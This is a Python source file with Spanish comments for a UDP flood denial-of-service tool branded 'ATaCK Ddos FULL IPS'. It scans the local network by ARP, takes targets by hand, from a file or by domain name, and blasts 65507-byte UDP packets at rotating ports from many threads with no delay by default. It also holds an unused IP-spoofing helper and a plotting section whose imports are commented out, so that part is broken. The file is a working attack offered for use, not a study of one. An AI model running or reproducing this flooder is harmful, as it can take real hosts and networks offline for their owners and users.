import socket
import threading
import time
import sys
import random
import os
import psutil  # Para monitorizar CPU y red
from colorama import init, Fore, Style
from queue import Queue
from datetime import datetime
import netifaces  # Para obtener interfaces de red
from scapy.all import ARP, Ether, srp  # Para escanear la red interna
import ifaddr  # Para obtener nombres correctos de interfaces y direcciones IP

init()  # Inicializa colorama para colores en terminal

# Variables globales para estadísticas
packets_sent = 0
packets_failed = 0
targets_ok = []
targets_error = []
targets_failed = []
total_bytes_sent = 0
lock = threading.Lock()
current_target = None
targets_queue = Queue()
attack_running = True  # Control de pausa y parada
attack_paused = False
current_ports = []  # Para almacenar puertos usados en la sesión
rotating_ports = []  # Para almacenar puertos rotando
current_port = None  # Puerto actual en uso

# Archivo de log
log_file = "attack_summary.log"

# Función para obtener la fecha y hora actual
def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Función para borrar el archivo de log
def clear_log_file():
    with open(log_file, "w") as log:
        log.write("")  # Borrar el contenido del archivo

# Función para escribir el resumen final en el archivo log
def write_summary_to_log():
    with open(log_file, "a") as log:
        log.write("\n" + "=" * 40 + "\n")
        log.write(f"RESUMEN FINAL DE LA EJECUCIÓN - {get_timestamp()}\n")
        log.write("=" * 40 + "\n")
        log.write(f"IPs exitosas: {len(targets_ok)}\n")
        log.write(f"IPs con errores: {len(targets_error)}\n")
        log.write(f"Total de paquetes enviados: {packets_sent}\n")
        log.write(f"Total de paquetes fallidos: {packets_failed}\n")
        log.write(f"Total de datos enviados: {total_bytes_sent / (1024 * 1024):.2f} MB\n")
        log.write("=" * 40 + "\n")
        log.write(f"Puertos rotando: {rotating_ports}\n")
        log.write(f"Lista de IPs exitosas: {targets_ok}\n")
        log.write(f"Lista de IPs con errores: {targets_error}\n")
        log.write("=" * 40 + "\n")

# Función para obtener nombres correctos de interfaces y direcciones IP
def get_network_interfaces():
    adapters = ifaddr.get_adapters()
    interfaces = []
    for adapter in adapters:
        for ip in adapter.ips:
            if ip.is_IPv4:
                interfaces.append({
                    "name": adapter.nice_name,
                    "ip": ip.ip,
                    "network": f"{ip.ip}/{ip.network_prefix}"
                })
    return interfaces

# Función para escanear la red interna
def scan_network(interface):
    try:
        network = interface["network"]
        iface_name = interface["name"]
        print(f"Escaneando la red {network} en la interfaz {iface_name}...")

        # Crear paquete ARP para escanear la red
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=3, verbose=0)[0]

        # Lista de IPs activas encontradas
        active_ips = []
        for sent, received in result:
            active_ips.append((received.psrc, received.hwsrc))  # IP y MAC

        return active_ips

    except Exception as e:
        print(f"Error escaneando la red: {e}")
        return []

# Función para seleccionar la interfaz de red antes del escaneo
def select_network_interface():
    interfaces = get_network_interfaces()
    print("Interfaces de red disponibles:")
    for i, iface in enumerate(interfaces):
        print(f"{i}. {iface['name']} - {iface['ip']}")
    
    while True:
        choice = input("Selecciona la interfaz de red para escanear (introduce el número) o 's' para salir: ").lower()
        if choice == 's':
            return None
        try:
            choice = int(choice)
            if 0 <= choice < len(interfaces):
                return interfaces[choice]
            else:
                print("Selección inválida. Inténtalo de nuevo.")
        except ValueError:
            print("Entrada no válida. Inténtalo de nuevo.")

# Opción para escanear la red interna
def start_network_scan():
    while True:
        interface = select_network_interface()
        if interface:
            active_ips = scan_network(interface)
            if active_ips:
                print("IPs activas detectadas:")
                for i, (ip, mac) in enumerate(active_ips):
                    print(f"{i}. IP: {ip} - MAC: {mac}")
                
                ip_choice = input("Selecciona una IP de la lista (introduce el número) o 's' para salir: ").lower()
                if ip_choice == 's':
                    break
                try:
                    ip_choice = int(ip_choice)
                    if 0 <= ip_choice < len(active_ips):
                        return active_ips[ip_choice][0]  # Retorna la IP seleccionada
                    else:
                        print("Selección de IP inválida.")
                except ValueError:
                    print("Entrada no válida.")
            else:
                print("No se encontraron IPs activas.")
                break
        else:
            print("No se seleccionó ninguna interfaz. Terminando...")
            break
    return None

# Resolver dominios
def resolve_domain(target):
    try:
        ip = socket.gethostbyname(target)
        return ip
    except socket.gaierror:
        print(f"Error al resolver el dominio {target}")
        return None

# IP Spoofing
def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# Función para generar contenido aleatorio
def generate_random_content(size):
    return os.urandom(size)

# Función para generar patrones complejos
def generate_pattern_content(size):
    pattern = b'ABCD' * (size // 4)  # Repite un patrón simple
    return pattern[:size]

# ataque UDP para usar contenido variable
def exploit_udp_dos(target_ip, ports, delay_between_requests, packet_size, send_count):
    global packets_sent, packets_failed, total_bytes_sent, attack_paused, attack_running, current_ports, current_port
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    used_ports = set()  # Para rastrear puertos usados en cada ejecución

    try:
        for _ in range(send_count):
            if not attack_running:  # Detener ataque si la bandera es False
                break
            while attack_paused:  # Pausar ataque si la bandera es True
                time.sleep(1)

            current_port = random.choice(ports)  # Seleccionar puerto actual
            used_ports.add(current_port)
            
            # Elegir contenido de forma aleatoria
            if random.choice([True, False]):
                message = generate_random_content(packet_size)
            else:
                message = generate_pattern_content(packet_size)

            try:
                s.sendto(message, (target_ip, current_port))
                with lock:
                    packets_sent += 1
                    total_bytes_sent += packet_size
            except Exception:
                with lock:
                    packets_failed += 1
            time.sleep(delay_between_requests)

    except Exception as e:
        print(f"Error: {e}")
        with lock:
            packets_failed += 1

    finally:
        s.close()
        current_ports.extend(used_ports)  # Agregar puertos usados a la lista global

# El resto del código sigue igual...


# Monitorizar el uso de CPU y red
def monitor_usage():
    cpu_usage = psutil.cpu_percent(interval=1)
    net_io = psutil.net_io_counters()
    return cpu_usage, net_io.bytes_sent

# Validar IP
def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# Limpiar la pantalla (cross-platform)
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Mostrar estadísticas en un área fija de la pantalla
def display_stats():
    global packets_sent, packets_failed, current_target, rotating_ports, current_port, stats_thread_running
    stats_thread_running = True
    while attack_running:
        cpu_usage, bytes_sent = monitor_usage()

        # Mover cursor a la parte superior de la pantalla
        sys.stdout.write("\033[H")  # Mueve el cursor a la posición 0,0
        sys.stdout.write("\033[J")  # Limpia la pantalla desde la posición actual

        # Mostrar estadísticas en curso
        print(f"Objetivo actual: {Fore.YELLOW}{current_target}{Style.RESET_ALL}")
        print(f"Paquetes enviados: {Fore.GREEN}{packets_sent}{Style.RESET_ALL}")
        print(f"Paquetes fallidos: {Fore.RED}{packets_failed}{Style.RESET_ALL}")
        print(f"Uso de CPU: {cpu_usage}%")
        print(f"Ancho de banda: {bytes_sent / (1024 * 1024):.2f} MB")
        print(f"Puerto actual: {Fore.CYAN}{current_port}{Style.RESET_ALL}")
        print(f"Puertos rotando: {rotating_ports}")
        print(f"Presiona s para salir y p para pausar/reanudar")
        time.sleep(1)

    stats_thread_running = False

# Leer IPs/Dominios desde un archivo
def load_targets_from_file(filename):
    try:
        with open(filename, 'r') as file:
            for line in file:
                target = line.strip()
                if target:
                    ip = resolve_domain(target) if not validate_ip(target) else target
                    if ip:
                        targets_queue.put((target, ip))
    except FileNotFoundError:
        print(f"Archivo {filename} no encontrado.")
        sys.exit(1)

# Ajustar el número de hilos dinámicamente basado en el uso de CPU
def adjust_threads(num_threads):
    cpu_usage = psutil.cpu_percent(interval=1)
    
    if cpu_usage < 2:  # Si la CPU está por debajo del 50%, aumentar hilos
        num_threads += 3
    elif cpu_usage > 15:  # Si la CPU está por encima del 80%, reducir hilos
        num_threads = max(1, num_threads - 5)  # Evitar que los hilos sean 0

    return num_threads

# Ejecutar ataques por lista de IPs
def attack_from_queue(ports, delay_between_requests, packet_size, send_count, num_threads):
    global current_target, targets_ok, targets_error, targets_failed, attack_running, rotating_ports, current_port
    while not targets_queue.empty() and attack_running:
        target_name, target_ip = targets_queue.get()
        current_target = target_name  # Mostrar el nombre o IP actual
        threads = []
        rotating_ports = ports.copy()  # Inicializar rotación de puertos
        
        try:
            threading.Thread(target=display_stats, daemon=True).start()
            for _ in range(num_threads):
                thread = threading.Thread(target=exploit_udp_dos, args=(target_ip, ports, delay_between_requests, packet_size, send_count))
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()

            # Marcar como exitoso
            targets_ok.append(current_target)

        except KeyboardInterrupt:
            print("\nInterrupción detectada. Terminando el ataque...")
            attack_running = False
            break
        except Exception as e:
            print(f"Error durante el ataque a {current_target}: {e}")
            targets_error.append(current_target)
        finally:
            print(f"Ataque a {current_target} finalizado.")
            # Ajustar el número de hilos dinámicamente
            num_threads = adjust_threads(num_threads)

    write_summary_to_log()
    clear_screen()
    display_final_stats()

# Mostrar las estadísticas finales
def display_final_stats():
    global packets_sent, packets_failed, total_bytes_sent, targets_ok, targets_error
    
    clear_screen()

    print("\n" + "=" * 40)
    print(f"RESUMEN FINAL DE LA EJECUCIÓN - {get_timestamp()}")
    print("=" * 40)
    print(f"IPs exitosas: {Fore.GREEN}{len(targets_ok)}{Style.RESET_ALL}")
    print(f"IPs con errores: {Fore.RED}{len(targets_error)}{Style.RESET_ALL}")
    print(f"Total de paquetes enviados: {Fore.GREEN}{packets_sent}{Style.RESET_ALL}")
    print(f"Total de paquetes fallidos: {Fore.RED}{packets_failed}{Style.RESET_ALL}")
    print(f"Total de datos enviados: {Fore.GREEN}{total_bytes_sent / (1024 * 1024):.2f} MB{Style.RESET_ALL}")
    print("=" * 40)
    print(f"Puertos Usados: {Fore.CYAN}{current_ports}{Style.RESET_ALL}")
    print("=" * 40)

# Escuchar comandos para pausar o detener el ataque
def command_listener():
    global attack_running, attack_paused
    while attack_running:
        command = input("\nIntroduce comando (p=pausar/reanudar, s=detener): ").lower()
        if command == 'p':
            attack_paused = not attack_paused
            status = "Pausado" if attack_paused else "Reanudado"
            print(f"\n{status} el ataque.")
        elif command == 's':
            attack_running = False
            print("\nDeteniendo el ataque...")
            break

# Banner
def print_banner():
    time.sleep(3)
    clear_screen()
    banner = """
██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗   ██╗██╗██████╗ 
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║   ██║██║██╔══██╗ By AULAUNIVERSAL
██████╔╝██║     ███████║██║     █████╔╝ ██║   ██║██║██║  ██║
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ╚██╗ ██╔╝██║██║  ██║
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗ ╚████╔╝ ██║██████╔╝ ATaCK Ddos FULL IPS
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═════╝ 
                                                            
    """
    print(banner)

# Additional imports for monitoring and visualization
#import matplotlib.pyplot as plt
#import matplotlib.animation as animation

# Variables to track metrics for real-time plotting
cpu_usage_data = []
memory_usage_data = []
packets_sent_data = []
packets_failed_data = []
time_data = []
start_time = time.time()

# Function to update the plot with real-time data
def update_plot(frame):
    global packets_sent, packets_failed, start_time
    current_time = time.time() - start_time

    # Update data lists
    cpu_usage_data.append(psutil.cpu_percent())
    memory_usage_data.append(psutil.virtual_memory().percent)
    packets_sent_data.append(packets_sent)
    packets_failed_data.append(packets_failed)
    time_data.append(current_time)

    # Limit data lists to the last 50 entries for readability
    if len(time_data) > 50:
        cpu_usage_data.pop(0)
        memory_usage_data.pop(0)
        packets_sent_data.pop(0)
        packets_failed_data.pop(0)
        time_data.pop(0)

    # Clear current plot
    ax.clear()

    # Plot CPU and Memory usage
    ax.plot(time_data, cpu_usage_data, label='CPU Usage (%)', color='r')
    ax.plot(time_data, memory_usage_data, label='Memory Usage (%)', color='b')

    # Plot Packets Sent and Failed
    ax2.plot(time_data, packets_sent_data, label='Packets Sent', color='g')
    ax2.plot(time_data, packets_failed_data, label='Packets Failed', color='m')

    # Set plot titles and labels
    ax.set_title('CPU and Memory Usage Over Time')
    ax.set_xlabel('Time (s)')
    ax.set_ylabel('Usage (%)')
    ax.legend(loc='upper left')

    ax2.set_title('Packets Sent and Failed Over Time')
    ax2.set_xlabel('Time (s)')
    ax2.set_ylabel('Count')
    ax2.legend(loc='upper left')

# Function to start the real-time plot
def start_monitoring():
    global ax, ax2
    fig, (ax, ax2) = plt.subplots(2, 1, figsize=(10, 8))
    ani = animation.FuncAnimation(fig, update_plot, interval=1000)  # Update every second
    plt.tight_layout()
    plt.show()

def main():
    clear_log_file()  # Limpiar el archivo de log al inicio
    print_banner()

    # Start real-time monitoring
    monitoring_thread = threading.Thread(target=start_monitoring, daemon=True)
    monitoring_thread.start()
    global attack_running, attack_paused
    
    clear_log_file()  # Limpiar el archivo de log al inicio

    print_banner()

    # Opción para escanear la red interna
    choice_scan = input("¿Deseas escanear la red interna para detectar IPs vivas? (s/n): ").lower()

    if choice_scan == 's':
        interface = select_network_interface()
        if interface:
            active_ips = scan_network(interface)
            if active_ips:
                print("IPs activas detectadas:")
                for i, (ip, mac) in enumerate(active_ips):
                    print(f"{i}. IP: {ip} - MAC: {mac}")

                ip_choice = input("Selecciona una IP de la lista (introduce el número): ")
                try:
                    ip_choice = int(ip_choice)
                    if 0 <= ip_choice < len(active_ips):
                        targets_queue.put((active_ips[ip_choice][0], active_ips[ip_choice][0]))
                    else:
                        print("Selección de IP inválida.")
                        return
                except ValueError:
                    print("Entrada no válida.")
                    return
            else:
                print("No se encontraron IPs activas.")
                return
        else:
            print("No se seleccionó ninguna interfaz. Terminando...")
            return
    else:
        choice = input("¿Quieres introducir una IP/Dominio manualmente o cargar desde un archivo? (m/a): ").lower()

        if choice == 'm':
            target = input("Introduce la IP o dominio objetivo: ")
            ip = resolve_domain(target) if not validate_ip(target) else target
            if not ip:
                print("Dirección IP/Dominio no válido. Terminando...")
                return
            targets_queue.put((target, ip))

        elif choice == 'a':
            filename = input("Introduce el nombre del archivo que contiene las IPs o dominios: ")
            load_targets_from_file(filename)

        else:
            print("Opción no válida. Terminando...")
            return

    # Parámetros del ataque
    ports = input("Introduce los puertos separados por comas (dejar vacío para usar el predeterminado 2024,80,8080,443,23,21,22,139,1000): ")
    if not ports:
        ports = [2024,80,8080,443,23,21,22,139,1000,554]  # Puerto predeterminado
    else:
        ports = [int(p) for p in ports.split(',')]

    packet_size = input("Introduce el tamaño del paquete (máximo 65507, dejar vacío para usar predeterminado 65507): ")
    if not packet_size:
        packet_size = 65507  # Tamaño de paquete predeterminado
    else:
        packet_size = int(packet_size)

    send_count = input("Introduce la cantidad de paquetes a enviar (dejar vacío para usar predeterminado 50000): ")
    if not send_count:
        send_count = 50000  # Cantidad de envíos predeterminado
    else:
        send_count = int(send_count)

    delay_between_requests = input("Introduce el tiempo de espera entre paquetes en segundos (dejar vacío para usar predeterminado 0.0): ")
    if not delay_between_requests:
        delay_between_requests = 0.0  # Tiempo de espera predeterminado
    else:
        delay_between_requests = float(delay_between_requests)

    num_threads = input("Introduce el número de hilos (dejar vacío para usar predeterminado 1): ")
    if not num_threads:
        num_threads = 1  # Número de hilos predeterminado
    else:
        num_threads = int(num_threads)

    # Iniciar ataque
    attack_thread = threading.Thread(target=attack_from_queue, args=(ports, delay_between_requests, packet_size, send_count, num_threads))
    attack_thread.start()

    # Escuchar comandos
    command_listener()
    attack_thread.join()

if __name__ == "__main__":
    main()